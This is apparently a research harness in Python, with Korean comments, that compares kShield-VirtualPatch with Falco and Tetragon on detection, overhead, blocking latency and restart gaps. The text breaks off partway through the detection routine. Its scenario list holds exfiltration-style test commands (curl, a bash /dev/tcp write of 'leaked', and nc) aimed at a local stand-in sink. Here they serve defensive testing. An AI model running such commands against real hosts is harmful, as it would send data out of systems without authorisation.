#!/usr/bin/env python3
"""
run_comparison.py — kShield-VirtualPatch vs Falco vs Tetragon 비교 실험 실행기

서브커맨드
  check    사전 점검만 수행(root, 바이너리, 룰/정책 파일, 잔존 프로세스)
  detect   같은 공격 시나리오를 각 도구에 N회 반복해 탐지·차단 여부를 기록
  perf     off / kshield / falco / tetragon 성능 오버헤드를 같은 세션에서
           ABBA 교차 순서로 측정한다 (결과: attack/results/cmp_raw_*.csv)
  latency  exec/connect가 "syscall 진입 -> 실제 차단"까지 걸리는 시간(ns)을
           bpftrace로 중립 관측한다 — kShield-v3(비동기 SIGKILL)와
           kShield-LSM(동기 -EPERM)의 공격 윈도 길이 차이를 재는 게 1차
           목적이며, falco/tetragon도 같은 그룹 목록에 넣으면 잰다
           (결과: attack/results/latency_raw_*.csv)
  restart-gap  도구를 kill -9로 죽이고 즉시 재기동하는 동안, 재탐지(막는
           도구는 공격 종료 코드, Falco는 로그 마커)까지 몇 초나 걸리는지
           N회 반복 측정한다 — 3.9절(kShield/Tetragon, 정성적)·4.6.1절
           (Falco, N=1)을 같은 방법론으로 통일해 재본다. mock 서버/HTTP는
           거치지 않고 watched_self[] 매칭으로 직접 fork+exec한다 — 첫
           버전은 HTTP job 제출 경로를 썼다가 그 경로 자체의 지연을
           kShield의 진짜 gap(0.003~0.005초)과 혼동해 3.1초로 잘못
           보고했었다 (결과: attack/results/restart_gap_raw_*.csv)

반드시 root로 실행한다.
    sudo python3 attack/compare/run_comparison.py check
    sudo python3 attack/compare/run_comparison.py detect
    sudo python3 attack/compare/run_comparison.py perf
    sudo python3 attack/compare/run_comparison.py latency --groups kshield,kshield_lsm
    sudo python3 attack/compare/run_comparison.py restart-gap --groups kshield,falco,tetragon

측정 설계
  - 도구를 먼저 띄운 뒤 mock 서버를 띄운다. 모든 도구가 자기 방식으로 계보를
    처음부터 관찰하게 하기 위해서다(kShield의 /proc 백필 같은 차이가 결과를
    좌우하지 않도록).
  - 그룹 순서는 라운드마다 뒤집는다(ABBA). 시간에 따른 시스템 드리프트를 상쇄한다.
  - tool_cpu_s는 사용자 공간 에이전트가 쓴 CPU 시간이다. BPF 프로그램 자체의
    실행 시간은 트리거한 프로세스에 계상되므로 처리량/지연에 반영된다.
  - tool_read_bytes/tool_write_bytes는 /proc/{pid}/io의 read_bytes/write_bytes(런 사이의
    델타) — 도구 자신이 실제로 스토리지에서 읽고 쓴 바이트(디스크 I/O)다.
  - tool_rchar_b/tool_wchar_b는 같은 파일의 rchar/wchar 델타 — read()/write() 시스템
    콜에 오간 총 바이트로, 소켓·파이프·디스크가 섞여 있어 네트워크 I/O만 분리하지는
    못한다. 순수 네트워크 바이트가 필요하면 별도로 nethogs 등을 써야 한다.
"""
import argparse
import csv
import hashlib
import json
import os
import shlex
import re
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
import urllib.request
from datetime import datetime

HERE = os.path.dirname(os.path.abspath(__file__))
ATTACK_DIR = os.path.dirname(HERE)
REPO_ROOT = os.path.dirname(ATTACK_DIR)
RESULTS_DIR = os.path.join(ATTACK_DIR, "results")
sys.path.insert(0, ATTACK_DIR)
import stat_analysis  # noqa: E402  (run_once 재사용)

MOCK_SERVER = os.path.join(ATTACK_DIR, "mock_ray_server.py")
FALCO_RULES = os.path.join(HERE, "falco_vpatch_rules.yaml")
FALCO_NORULES_RULES = os.path.join(HERE, "falco_norules.yaml")
TETRAGON_POLICY = os.path.join(HERE, "tetragon_vpatch_policy.yaml")
TETRAGON_POLICY_NAME = "kcmp-shadow-connect"
KSHIELD_BIN = os.path.join(REPO_ROOT, "src", "kshield_vpatch")
KSHIELD_LSM_BIN = os.path.join(REPO_ROOT, "src", "kshield_vpatch_lsm")
KSHIELD_CTL = os.path.join(REPO_ROOT, "src", "kshield_ctl")
LATENCY_SCRIPT = os.path.join(HERE, "latency_probe.bt")

DEFAULT_GROUPS = "off,kshield,falco,tetragon"
ALL_GROUPS = ["off", "kshield", "kshield_lsm", "falco", "falco_default", "falco_norules",
              "tetragon", "tetragon_norules"]
STRAY_PROCESS_NAMES = ["falco", "tetragon", "kshield_vpatch", "kshield_vpatch_lsm"]

RAW_FIELDS = ["workload", "round", "group", "run", "throughput_rps", "latency_mean_ms",
              "latency_p99_ms", "failures", "tool_cpu_s", "tool_rss_kb",
              "tool_read_bytes", "tool_write_bytes", "tool_rchar_b", "tool_wchar_b"]

# (이름, 공격 여부, entrypoint 템플릿). {ip}:{port}는 신뢰되지 않은 목적지(Sink)다.
SCENARIO_TEMPLATES = [
    ("benign_echo", False, "echo benign-job"),
    ("curl_untrusted", True, "curl -s -m 3 -o /dev/null http://{ip}:{port}/"),
    ("bash_devtcp", True, "bash -c 'exec 3<>/dev/tcp/{ip}/{port}; echo leaked >&3'"),
    ("nc_untrusted", True, "nc -w 2 {ip} {port} < /dev/null"),
]


def build_scenarios(ip, port):
    return [(name, cmd.format(ip=ip, port=port), attack) for name, attack, cmd in SCENARIO_TEMPLATES]


def log(msg):
    print(msg, flush=True)


def die(msg):
    print(f"[오류] {msg}", file=sys.stderr, flush=True)
    sys.exit(1)


def run(cmd, timeout=30):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except (OSError, subprocess.TimeoutExpired) as e:
        return subprocess.CompletedProcess(cmd, 127, "", str(e))


def require_root():
    if os.geteuid() != 0:
        die("root 권한이 필요합니다: sudo python3 attack/compare/run_comparison.py ...")


def chown_tree(path):
    uid, gid = os.environ.get("SUDO_UID"), os.environ.get("SUDO_GID")
    if not (uid and gid):
        return
    targets = [path]
    if os.path.isdir(path):
        for base, dirs, files in os.walk(path):
            targets += [os.path.join(base, n) for n in dirs + files]
    for t in targets:
        try:
            os.chown(t, int(uid), int(gid))
        except OSError:
            pass


def pgrep(name):
    # 리눅스 comm은 TASK_COMM_LEN-1=15자까지만 저장한다. "kshield_vpatch_lsm"(18자)
    # 같은 이름은 커널이 "kshield_vpatch_"로 잘라서 저장하므로, pgrep -x에 원래
    # 이름을 그대로 넘기면 절대 안 걸린다 — 실제로 이 때문에 고아 상태의
    # kshield_vpatch_lsm 데몬이 이틀 넘게 ensure_clean()을 매번 통과해 여러 실험을
    # 오염시켰다(2026-09-28 발견). 커널과 동일하게 15자로 잘라서 비교해야 한다.
    r = run(["pgrep", "-x", name[:15]])
    return [int(x) for x in r.stdout.split()] if r.returncode == 0 else []


def ensure_clean():
    stray = {n: pgrep(n) for n in STRAY_PROCESS_NAMES}
    stray = {n: p for n, p in stray.items() if p}
    if stray:
        desc = ", ".join(f"{n}{p}" for n, p in stray.items())
        die(f"베이스라인 오염을 막기 위해 다음 프로세스를 먼저 종료하세요: {desc}\n"
            "  예) sudo systemctl stop tetragon; sudo systemctl stop falco-modern-bpf; "
            "sudo pkill -x kshield_vpatch")


def cpu_seconds(pid):
    try:
        with open(f"/proc/{pid}/stat") as f:
            rest = f.read().rsplit(")", 1)[1].split()
        return (int(rest[11]) + int(rest[12])) / os.sysconf("SC_CLK_TCK")
    except (OSError, IndexError, ValueError):
        return float("nan")


def rss_kb(pid):
    try:
        with open(f"/proc/{pid}/status") as f:
            for line in f:
                if line.startswith("VmRSS:"):
                    return float(line.split()[1])
    except (OSError, ValueError):
        pass
    return float("nan")


def io_counters(pid):
    """/proc/{pid}/io의 누적 카운터. read_bytes/write_bytes는 실제 스토리지(디스크) I/O이고,
    rchar/wchar는 read()/write() 시스템 콜에 오간 바이트 수로 소켓·파이프·디스크가 섞여 있다
    — 네트워크 I/O만 따로 떼어내는 값은 아니며, "디스크 I/O + 그 밖의 read/write 총량"에
    대한 근사치로만 쓴다(4.5절 자원 비교 확장, 한계는 결과에 함께 기록한다)."""
    d = {"rchar": float("nan"), "wchar": float("nan"),
         "read_bytes": float("nan"), "write_bytes": float("nan")}
    try:
        with open(f"/proc/{pid}/io") as f:
            for line in f:
                k, _, v = line.partition(":")
                k = k.strip()
                if k in d:
                    d[k] = int(v.strip())
    except (OSError, ValueError):
        pass
    return d


def io_delta(before, after, key):
    x, y = before.get(key), after.get(key)
    if x != x or y != y:  # NaN
        return ""
    return round(y - x)


def spawn(cmd, logpath):
    lf = open(logpath, "ab", buffering=0)
    proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.STDOUT, start_new_session=True)
    return proc, lf


def terminate(proc, timeout=15):
    if proc is None or proc.poll() is not None:
        return
    try:
        os.killpg(proc.pid, signal.SIGINT)
        proc.wait(timeout=timeout)
        return
    except ProcessLookupError:
        return
    except subprocess.TimeoutExpired:
        pass
    try:
        os.killpg(proc.pid, signal.SIGTERM)
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        os.killpg(proc.pid, signal.SIGKILL)
        proc.wait()
    except ProcessLookupError:
        pass


def wait_port(host, port, timeout=15.0):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with socket.create_connection((host, port), timeout=1):
                return True
        except OSError:
            time.sleep(0.2)
    return False


# ── 도구 제어 ───────────────────────────────────────────────────────────────
class Tool:
    """off(도구 없음) 베이스라인. 다른 도구의 부모 클래스."""
    name = "off"
    markers = []
    # restart-gap 전용: 이 도구가 실제로 막는(kill/거부) 도구면 공격 자신의 종료
    # 코드 집합을 적는다(예: SIGKILL=137). None이면 "막지 않고 탐지만 하는" 도구
    # (Falco)라는 뜻이며, 그때는 로그 마커로 판정한다 — 막는 도구를 로그로
    # 판정하면 안 되는 이유는 restart_gap 실험 자체의 docstring 참고.
    blocked_rc = None

    def __init__(self, args, logdir, capture_events=False):
        self.args = args
        self.logdir = logdir
        self.capture_events = capture_events
        self.proc = None
        self.logfile = None
        self.logpath = None
        self._pid = None

    def start(self):
        pass

    def stop(self):
        pass

    def crash(self):
        """kill -9로 강제 종료(정상 종료가 아닌, 크래시를 흉내 낸다). off에는 해당 없음."""
        if self._pid:
            try:
                os.kill(self._pid, signal.SIGKILL)
            except ProcessLookupError:
                pass

    def respawn_fast(self):
        """crash() 직후 즉시 재기동한다 — start()와 달리 warmup sleep을 넣지 않는다.
        재시작 무방비 구간(gap) 실험은 이 sleep 자체가 측정하려는 대상이므로,
        respawn 호출 자체는 최대한 빨리 반환하고 gap 유무는 호출부의 폴링 루프가 잰다."""
        pass

    def pid(self):
        return self._pid

    def cpu_s(self):
        return cpu_seconds(self._pid) if self._pid else float("nan")

    def rss(self):
        return rss_kb(self._pid) if self._pid else float("nan")

    def io(self):
        return io_counters(self._pid) if self._pid else io_counters(-1)

    def _spawn(self, cmd, logname):
        self.logpath = os.path.join(self.logdir, logname)
        self.proc, self.logfile = spawn(cmd, self.logpath)
        self._pid = self.proc.pid

    def _stop_spawned(self):
        terminate(self.proc)
        if self.logfile:
            self.logfile.close()

    def healthy(self):
        """도구가 실험 도중 죽지 않았는지. 죽었다면 탐지 0은 '못 잡음'이 아니라 '측정 무효'다."""
        return self.proc is None or self.proc.poll() is None

    def _require_alive(self):
        if self.proc.poll() is not None:
            die(f"{self.name}이(가) 기동 직후 종료되었습니다(종료 코드 {self.proc.returncode}). "
                f"로그 끝부분:\n{self.tail()}")

    def tail(self, n=15):
        if not self.logpath or not os.path.exists(self.logpath):
            return "(로그 없음)"
        with open(self.logpath, "rb") as f:
            lines = f.read().decode("utf-8", "replace").splitlines()
        return "\n".join(lines[-n:])

    def log_size(self):
        return os.path.getsize(self.logpath) if self.logpath and os.path.exists(self.logpath) else 0

    def read_log_from(self, offset):
        if not self.logpath or not os.path.exists(self.logpath):
            return ""
        with open(self.logpath, "rb") as f:
            f.seek(offset)
            return f.read().decode("utf-8", "replace")


class KShield(Tool):
    name = "kshield"
    markers = ["SHADOW_CONNECT 탐지", "SHADOW_EXEC 탐지"]
    bin_path = KSHIELD_BIN
    logname = "kshield.log"
    blocked_rc = {137}  # 비동기 kprobe SIGKILL

    def _spawn_self(self):
        if not os.access(self.bin_path, os.X_OK):
            die(f"{self.bin_path} 가 없습니다. 먼저 빌드하세요: cd src && make")
        if self.logfile:
            self.logfile.close()
        self._spawn([self.bin_path] + shlex.split(self.args.kshield_args), self.logname)

    def start(self):
        self._spawn_self()
        time.sleep(self.args.tool_warmup)
        self._require_alive()

    def respawn_fast(self):
        self._spawn_self()

    def stop(self):
        self._stop_spawned()


class KShieldLSM(KShield):
    name = "kshield_lsm"
    markers = ["LSM_CONNECT_BLOCK 탐지", "LSM_EXEC_BLOCK 탐지"]
    bin_path = KSHIELD_LSM_BIN
    logname = "kshield_lsm.log"
    blocked_rc = {126}  # 동기 -EPERM(exec 자체 실패, bash의 "cannot execute" 관례)


class Falco(Tool):
    name = "falco"
    markers = ["KCMP_SHADOW_CONNECT", "KCMP_SHADOW_EXEC"]

    def rules_path(self):
        return FALCO_RULES

    def _spawn_self(self):
        cmd = [self.args.falco_bin, "-r", self.rules_path(),
               "-o", f"engine.kind={self.args.falco_engine}",
               "-o", "json_output=true", "-o", "buffered_outputs=false"]
        cmd += shlex.split(self.args.falco_extra)
        if self.logfile:
            self.logfile.close()
        self._spawn(cmd, f"{self.name}.log")

    def start(self):
        self._spawn_self()
        time.sleep(self.args.tool_warmup)
        self._require_alive()

    def respawn_fast(self):
        self._spawn_self()

    def stop(self):
        self._stop_spawned()


class FalcoDefault(Falco):
    """Falco 기본 룰셋을 그대로 쓴 참고용 그룹(일반적 배포 상태의 비용)."""
    name = "falco_default"
    markers = []

    def rules_path(self):
        return self.args.falco_default_rules


class FalcoNoRules(Falco):
    """활성 룰이 없는(대조군) Falco — 에이전트 기반 비용과 룰 매칭 비용을 분리한다.
    완전히 빈 룰 파일 대신, 결코 참이 되지 않는 더미 룰 하나만 둔다(일부 Falco
    버전이 룰 0개인 파일을 거부할 수 있어 우회). modern eBPF 드라이버가 받는
    이벤트 스트림 자체는 falco 그룹과 동일하며, KCMP_SHADOW_* 두 룰의 조상
    프로세스 탐색(proc.aname[1..6])만 빠진다."""
    name = "falco_norules"
    markers = []

    def rules_path(self):
        return FALCO_NORULES_RULES


class Tetragon(Tool):
    name = "tetragon"
    markers = [TETRAGON_POLICY_NAME]
    policy_path = TETRAGON_POLICY
    policy_name = TETRAGON_POLICY_NAME
    blocked_rc = {137}  # connect 단계에서 SIGKILL(4.5절)

    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        self.events_proc = None
        self.events_file = None

    def tetra(self, *rest):
        return [self.args.tetra_bin] + shlex.split(self.args.tetra_extra) + list(rest)

    def healthy(self):
        return self.events_proc is None or self.events_proc.poll() is None

    def _socket_path(self):
        m = re.search(r"unix://(\S+)", self.args.tetra_extra)
        return m.group(1) if m else None

    def _start_events(self):
        """이벤트 스트림을 띄운다. 소켓이 아직 없으면 tetra가 곧바로 종료하므로,
        살아 있는 것을 확인할 때까지 재시도한다(죽은 스트림은 탐지 0으로 조용히 기록되기 때문)."""
        self.logpath = os.path.join(self.logdir, "tetragon_events.log")
        for _ in range(5):
            open(self.logpath, "wb").close()  # 이전 시도의 오류 메시지를 비운다
            self.events_proc, self.events_file = spawn(self.tetra("getevents", "-o", "json"), self.logpath)
            time.sleep(1.5)
            if self.events_proc.poll() is None:
                return
            self.events_file.close()
            time.sleep(1)
        tail = self.tail()
        self.stop()
        die(f"tetra getevents 스트림을 5회 시도해도 유지되지 않았습니다. 로그:\n{tail}")

    def start(self):
        svc = self.args.tetragon_service
        r = run(["systemctl", "start", svc])
        if r.returncode != 0:
            die(f"systemctl start {svc} 실패: {r.stderr.strip()}")
        sock = self._socket_path()
        ready = False
        end = time.time() + 40
        while time.time() < end and not ready:
            ready = (sock is None or os.path.exists(sock)) and any(
                run(self.tetra(*c), timeout=10).returncode == 0
                for c in (("status",), ("tracingpolicy", "list")))
            if not ready:
                time.sleep(1)
        if not ready:
            self.stop()
            die("tetragon 에이전트가 40초 안에 준비되지 않았습니다. `tetra status`와 "
                f"`journalctl -u {svc}`를 확인하세요.")
        pid = run(["systemctl", "show", "-p", "MainPID", "--value", svc]).stdout.strip()
        self._pid = int(pid) if pid.isdigit() and int(pid) > 0 else None

        if self.capture_events:
            self._start_events()

        if self.policy_path:
            r = run(self.tetra("tracingpolicy", "add", self.policy_path))
            if r.returncode != 0:
                self.stop()
                die("Tetragon 정책 로드 실패 — 정책 파일 필드명을 확인하세요:\n"
                    f"{r.stdout}{r.stderr}")
        time.sleep(self.args.tool_warmup)

    def crash(self):
        """systemctl stop이 아니라 MainPID를 직접 SIGKILL — 의도된 종료가 아닌
        크래시를 흉내 낸다(3.9절과 동일한 방법론). systemd의 Restart=on-failure가
        데몬 자체는 알아서 재시작시키므로, respawn_fast()는 재기동을 직접 트리거하지
        않고 그 결과(MainPID 변경)만 기다린다."""
        pid = run(["systemctl", "show", "-p", "MainPID", "--value", self.args.tetragon_service]).stdout.strip()
        if pid.isdigit() and int(pid) > 0:
            try:
                os.kill(int(pid), signal.SIGKILL)
            except ProcessLookupError:
                pass

    def respawn_fast(self):
        """systemd가 데몬을 알아서 재시작시키는지 기다렸다가(최대 10초), 살아나면
        MainPID를 갱신하고 이벤트 스트림·정책을 다시 붙인다. 커널 BPF 프로그램
        자체는 데몬 생사와 무관하게 유지될 수 있다는 것이 3.9절의 발견이므로,
        여기서 실제로 재기동되는지는 이 실험이 검증하는 대상 중 하나다."""
        old_pid = self._pid
        new_pid = None
        end = time.time() + 10
        while time.time() < end:
            pid = run(["systemctl", "show", "-p", "MainPID", "--value",
                       self.args.tetragon_service]).stdout.strip()
            if pid.isdigit() and int(pid) > 0 and int(pid) != old_pid:
                new_pid = int(pid)
                break
            time.sleep(0.2)
        if new_pid is None:
            log(f"  [경고] {self.args.tetragon_service} 가 10초 안에 재시작되지 않았습니다"
                "(systemd Restart= 설정을 확인).")
            return
        self._pid = new_pid
        if self.capture_events:
            if self.events_proc:
                terminate(self.events_proc, timeout=5)
                if self.events_file:
                    self.events_file.close()
            self._start_events()
        if self.policy_path:
            run(self.tetra("tracingpolicy", "add", self.policy_path))

    def stop(self):
        terminate(self.events_proc)
        if self.events_file:
            self.events_file.close()
        if self.policy_name:
            run(self.tetra("tracingpolicy", "delete", self.policy_name), timeout=15)
        run(["systemctl", "stop", self.args.tetragon_service], timeout=60)


class TetragonNoPolicy(Tetragon):
    """TracingPolicy를 전혀 로드하지 않는(대조군) Tetragon — 에이전트가 정책과
    무관하게 기본으로 수행하는 프로세스 생명주기 관찰 비용만 측정한다."""
    name = "tetragon_norules"
    markers = []
    policy_path = None
    policy_name = None


def make_tool(group, args, logdir, capture_events=False):
    table = {"off": Tool, "kshield": KShield, "kshield_lsm": KShieldLSM, "falco": Falco,
             "falco_default": FalcoDefault, "falco_norules": FalcoNoRules,
             "tetragon": Tetragon, "tetragon_norules": TetragonNoPolicy}
    return table[group](args, logdir, capture_events)


# ── mock 서버 / 작업 제출 ───────────────────────────────────────────────────
def start_server(args, logdir):
    lf = open(os.path.join(logdir, "mock_server.log"), "ab", buffering=0)
    proc = subprocess.Popen([sys.executable, MOCK_SERVER, "--port", str(args.port)],
                            stdout=lf, stderr=subprocess.STDOUT, start_new_session=True)
    if not wait_port(args.host, args.port) or proc.poll() is not None:
        terminate(proc)
        die(f"mock 서버가 포트 {args.port}에서 시작되지 않았습니다(이미 사용 중인지 확인).")
    return proc, lf


def stop_server(server):
    if server:
        terminate(server[0], timeout=5)
        server[1].close()


def submit_job(host, port, entrypoint, timeout=10):
    req = urllib.request.Request(
        f"http://{host}:{port}/api/jobs/",
        data=json.dumps({"entrypoint": entrypoint}).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status


class Sink:
    """신뢰되지 않은(비 loopback) 목적지 역할을 하는 최소 TCP 수신기.

    VM이 외부망(예: 1.1.1.1)에 닿지 않아도 실험이 성립하도록 VM 자신의 비 loopback IPv4
    주소에 붙는다. 세 도구 모두 127.0.0.0/8 밖의 주소를 신뢰되지 않은 목적지로 취급하므로
    판정 기준은 같다. 연결 수립 수와 수신 바이트 수를 세어 차단이 첫 바이트가 나가기 전에
    이뤄졌는지도 본다(off 그룹에서는 모든 공격 시나리오가 수립돼야 한다)."""

    def __init__(self, ip, port):
        self.ip, self.port = ip, port
        self.accepted = 0
        self.bytes = 0
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind((ip, port))
        self._srv.listen(64)
        self._srv.settimeout(0.5)
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while not self._stop.is_set():
            try:
                conn, _ = self._srv.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            threading.Thread(target=self._handle, args=(conn,), daemon=True).start()

    def _handle(self, conn):
        with self._lock:
            self.accepted += 1
        try:
            conn.settimeout(1.0)
            data = conn.recv(4096)
            with self._lock:
                self.bytes += len(data)
            conn.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 0\r\n\r\n")
        except OSError:
            pass
        finally:
            conn.close()

    def snapshot(self):
        with self._lock:
            return self.accepted, self.bytes

    def close(self):
        self._stop.set()
        self._srv.close()
        self._thread.join(timeout=2)


def resolve_untrusted_ip(args):
    """신뢰되지 않은 목적지로 쓸 VM 자신의 비 loopback IPv4 주소."""
    if args.untrusted_ip != "auto":
        ip = args.untrusted_ip
    else:
        ip = None
        m = re.search(r"\bsrc (\d+\.\d+\.\d+\.\d+)", run(["ip", "-4", "route", "get", "1.1.1.1"]).stdout)
        if m:
            ip = m.group(1)
        else:
            for tok in run(["hostname", "-I"]).stdout.split():
                if re.fullmatch(r"\d+\.\d+\.\d+\.\d+", tok):
                    ip = tok
                    break
    if not ip:
        die("VM의 비 loopback IPv4 주소를 찾지 못했습니다. --untrusted-ip 로 지정하세요.")
    if ip.startswith("127."):
        die(f"{ip} 는 loopback이라 세 도구 모두 신뢰합니다. 비 loopback 주소를 지정하세요.")
    return ip


def wait_result(path, timeout):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with open(path) as f:
                s = f.read().strip()
            if s.startswith("rc="):
                return int(s[3:])
        except (OSError, ValueError):
            pass
        time.sleep(0.1)
    return None


# ── 사전 점검 ───────────────────────────────────────────────────────────────
def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        h.update(f.read())
    return h.hexdigest()


def preflight(args, groups):
    problems = []
    if not os.path.isfile(MOCK_SERVER):
        problems.append(f"{MOCK_SERVER} 없음")
    if "kshield" in groups and not os.access(KSHIELD_BIN, os.X_OK):
        problems.append(f"{KSHIELD_BIN} 없음 — cd src && make")
    if "kshield_lsm" in groups and not os.access(KSHIELD_LSM_BIN, os.X_OK):
        problems.append(f"{KSHIELD_LSM_BIN} 없음 — cd src && make")
    if any(g.startswith("falco") for g in groups):
        if not shutil.which(args.falco_bin):
            problems.append("falco 바이너리를 찾을 수 없음 (https://falco.org/docs/ 설치 문서 참고)")
        else:
            for rules_file in {FALCO_RULES} | ({FALCO_NORULES_RULES} if "falco_norules" in groups else set()):
                r = run([args.falco_bin, "-V", rules_file], timeout=60)
                if r.returncode != 0:
                    log(f"[경고] falco -V 룰 검증이 0이 아닌 코드로 끝남({rules_file}):\n{r.stdout}{r.stderr}")
    if "falco_default" in groups and not os.path.isfile(args.falco_default_rules):
        problems.append(f"Falco 기본 룰 파일 없음: {args.falco_default_rules}")
    if "falco_norules" in groups and not os.path.isfile(FALCO_NORULES_RULES):
        problems.append(f"{FALCO_NORULES_RULES} 없음")
    if any(g.startswith("tetragon") for g in groups):
        if not shutil.which(args.tetra_bin):
            problems.append("tetra CLI를 찾을 수 없음 (https://tetragon.io/docs/ 설치 문서 참고)")
        if run(["systemctl", "cat", args.tetragon_service]).returncode != 0:
            problems.append(f"systemd 서비스 '{args.tetragon_service}' 없음")
    if "tetragon" in groups:
        if not os.path.isfile(TETRAGON_POLICY):
            problems.append(f"{TETRAGON_POLICY} 없음")
        else:
            with open(TETRAGON_POLICY, encoding="utf-8") as f:
                text = f.read()
            for p in {sys.executable, os.path.realpath(sys.executable)}:
                if p not in text:
                    log(f"[경고] 정책 matchBinaries에 {p} 가 없습니다. python3 실행 경로를 추가하세요.")
    if problems:
        die("사전 점검 실패:\n  - " + "\n  - ".join(problems))
    ensure_clean()


def collect_meta(args, groups):
    def sh(cmd):
        r = run(cmd, timeout=20)
        return (r.stdout + r.stderr).strip()

    meta = {
        "timestamp": datetime.now().isoformat(timespec="seconds"),
        "groups": groups,
        "args": vars(args),
        "kernel": sh(["uname", "-r"]),
        "python": sys.version,
        "active_lsm": sh(["cat", "/sys/kernel/security/lsm"]),
        "cpu_model": sh(["sh", "-c", "grep -m1 'model name' /proc/cpuinfo"]),
        "cpu_count": os.cpu_count(),
        "repo_commit": sh(["git", "-C", REPO_ROOT, "rev-parse", "HEAD"]),
        "sha256": {"falco_rules": sha256(FALCO_RULES), "tetragon_policy": sha256(TETRAGON_POLICY)},
    }
    if any(g.startswith("falco") for g in groups):
        meta["falco_version"] = sh([args.falco_bin, "--version"])
    if any(g.startswith("tetragon") for g in groups):
        meta["tetra_version"] = sh([args.tetra_bin, "version"])
    return meta


# ── check ───────────────────────────────────────────────────────────────────
def cmd_check(args):
    require_root()
    groups = parse_groups(args)
    preflight(args, groups)
    log("사전 점검 통과. 그룹: " + ", ".join(groups))
    log(json.dumps(collect_meta(args, groups), ensure_ascii=False, indent=2))


# ── perf ────────────────────────────────────────────────────────────────────
def cmd_perf(args):
    require_root()
    groups = parse_groups(args)
    workloads = [w.strip() for w in args.workloads.split(",") if w.strip()]
    if args.runs % args.rounds != 0:
        die("--runs 는 --rounds 로 나누어떨어져야 합니다.")
    per_block = args.runs // args.rounds
    preflight(args, groups)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs(RESULTS_DIR, exist_ok=True)
    runs_dir = os.path.join(RESULTS_DIR, f"cmp_runs_{ts}")
    logdir = os.path.join(runs_dir, "logs")
    os.makedirs(logdir)
    raw_path = os.path.join(RESULTS_DIR, f"cmp_raw_{ts}.csv")
    meta_path = os.path.join(RESULTS_DIR, f"cmp_meta_{ts}.json")
    with open(meta_path, "w", encoding="utf-8") as f:
        json.dump(collect_meta(args, groups), f, ensure_ascii=False, indent=2)
    with open(raw_path, "w", newline="", encoding="utf-8") as f:
        csv.DictWriter(f, fieldnames=RAW_FIELDS).writeheader()

    log(f"그룹 {groups} | 워크로드 {workloads} | 그룹당 {args.runs}회 "
        f"({args.rounds}라운드 x {per_block}회) | 요청 {args.count}회/런")
    try:
        for workload in workloads:
            fork_heavy = workload == "fork"
            for rnd in range(args.rounds):
                order = groups if rnd % 2 == 0 else list(reversed(groups))
                for group in order:
                    log(f"\n=== [{workload}] 라운드 {rnd + 1}/{args.rounds} — {group} ===")
                    tool = make_tool(group, args, logdir)
                    server = None
                    try:
                        tool.start()
                        server = start_server(args, logdir)
                        stat_analysis.run_once(args.host, args.port, args.warmup,
                                               os.path.join(runs_dir, "warmup.csv"),
                                               fork_heavy=fork_heavy)
                        for i in range(per_block):
                            out = os.path.join(runs_dir, f"{workload}_{group}_r{rnd + 1}_{i + 1}.csv")
                            cpu0 = tool.cpu_s()
                            io0 = tool.io()
                            s = stat_analysis.run_once(args.host, args.port, args.count, out,
                                                       fork_heavy=fork_heavy)
                            cpu1 = tool.cpu_s()
                            io1 = tool.io()
                            row = {
                                "workload": workload, "round": rnd + 1, "group": group,
                                "run": rnd * per_block + i + 1,
                                "throughput_rps": s.get("throughput_rps", ""),
                                "latency_mean_ms": s.get("latency_mean_ms", ""),
                                "latency_p99_ms": s.get("latency_p99_ms", ""),
                                "failures": int(s.get("failure", 0)),
                                "tool_cpu_s": round(cpu1 - cpu0, 3) if cpu1 == cpu1 else "",
                                "tool_rss_kb": tool.rss() if tool.pid() else "",
                                "tool_read_bytes": io_delta(io0, io1, "read_bytes"),
                                "tool_write_bytes": io_delta(io0, io1, "write_bytes"),
                                "tool_rchar_b": io_delta(io0, io1, "rchar"),
                                "tool_wchar_b": io_delta(io0, io1, "wchar"),
                            }
                            with open(raw_path, "a", newline="", encoding="utf-8") as f:
                                csv.DictWriter(f, fieldnames=RAW_FIELDS).writerow(row)
                            warn = "  [경고: 실패 요청 있음]" if row["failures"] else ""
                            log(f"  run {row['run']:>2}: {row['throughput_rps']:>8} req/s  "
                                f"{row['latency_mean_ms']:>6} ms  cpu={row['tool_cpu_s']}s{warn}")
                    finally:
                        stop_server(server)
                        tool.stop()
                        time.sleep(args.cooldown)
    finally:
        chown_tree(runs_dir)
        for p in (raw_path, meta_path):
            if os.path.exists(p):
                chown_tree(p)
    log(f"\n원시 결과: {raw_path}\n메타데이터: {meta_path}")
    log(f"분석: python3 attack/compare/compare_stats.py {raw_path}")


# ── detect ──────────────────────────────────────────────────────────────────
def kshield_state_check(args, untrusted_ip):
    ctl = KSHIELD_CTL
    if not os.access(ctl, os.X_OK):
        log("[경고] kshield_ctl 없음 — 신뢰 IP/예외 목록 점검을 건너뜁니다.")
        return
    for sub in ("trust-list", "exempt-list", "cgroup-exempt-list"):
        r = run([ctl, sub, "--target", "v3"])
        out = (r.stdout + r.stderr).strip()
        log(f"  kshield_ctl {sub}: {out or '(비어 있음)'}")
        if sub == "trust-list" and untrusted_ip in out:
            die(f"{untrusted_ip} 가 신뢰 목적지로 등록되어 있어 탐지 실험이 왜곡됩니다. "
                f"sudo ./src/kshield_ctl trust-del {untrusted_ip} 후 다시 실행하세요.")


def cmd_detect(args):
    require_root()
    groups = parse_groups(args)
    ip = resolve_untrusted_ip(args)
    scenarios = build_scenarios(ip, args.untrusted_port)
    if not shutil.which("nc"):
        log("[경고] nc 가 없어 nc_untrusted 시나리오를 건너뜁니다.")
